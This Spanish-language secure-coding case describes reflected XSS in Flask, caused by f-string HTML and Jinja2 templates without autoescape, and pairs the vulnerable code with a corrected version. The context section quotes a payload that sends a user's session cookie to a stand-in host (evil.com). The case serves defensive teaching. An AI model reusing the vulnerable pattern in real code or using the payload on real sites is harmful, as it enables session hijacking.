# Case: XSS en Flask por template sin autoescape

## CVE

N/A (patrón de misconfiguration recurrente)

## CWE asociado

CWE-79

## Descripción

Flask con Jinja2 tiene autoescape habilitado por defecto en archivos `.html`, pero si se construyen respuestas HTML directamente con `f-strings` o `Template()` sin `Environment(autoescape=True)`, el input del usuario se renderiza sin escapar.

## Código vulnerable

```python
from flask import Flask, request

app = Flask(__name__)

@app.route("/search")
def search():
    query = request.args.get("q", "")
    # Retornar HTML directo sin escapar - XSS reflected
    return f"<h1>Resultados para: {query}</h1><p>No se encontraron resultados.</p>"

# También vulnerable: Jinja2 Template sin autoescape
from jinja2 import Template
tmpl = Template("Hello {{ name }}!")  # sin Environment con autoescape
```

## Código corregido

```python
from flask import Flask, request, render_template_string
from markupsafe import escape

app = Flask(__name__)

@app.route("/search")
def search():
    query = request.args.get("q", "")
    # Opción 1: escapar manualmente
    return f"<h1>Resultados para: {escape(query)}</h1>"

    # Opción 2 (recomendada): usar render_template con autoescape
    # return render_template("search.html", query=query)

# Jinja2 seguro con Environment
from jinja2 import Environment, BaseLoader
env = Environment(loader=BaseLoader(), autoescape=True)
tmpl = env.from_string("Hello {{ name }}!")
```

## Contexto

El payload `<script>document.location='http://evil.com/?c='+document.cookie</script>` inyectado en el parámetro `q` roba la cookie de sesión del usuario. render_template() de Flask siempre usa autoescape en archivos .html.

## Referencia

- https://flask.palletsprojects.com/en/latest/security/
- https://jinja.palletsprojects.com/en/latest/api/#autoescaping
